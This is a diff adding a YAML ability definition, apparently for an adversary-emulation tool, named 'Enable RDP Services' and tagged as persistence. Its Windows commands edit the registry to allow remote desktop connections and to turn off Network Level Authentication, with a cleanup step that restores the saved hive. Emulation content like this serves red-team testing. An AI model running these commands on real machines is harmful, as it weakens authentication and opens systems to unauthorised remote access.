@@ -1,0 +1,19 @@
+---
+
+- id: 2c61a0fc-8dc2-4c4e-84f0-265d78c37b4b
+  name: Enable RDP Services
+  description: Enable RDP Services
+  tactic: persistence
+  technique:
+    attack_id: 1076
+    name:
+  platforms:
+    windows:
+      cmd:
+        command: |
+          REG SAVE "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" terminal_server_hive;
+          REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\Winstations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0 /f;
+          REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+        cleanup: |
+          REG RESTORE "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" terminal_server_hive
+  privilege: Elevated
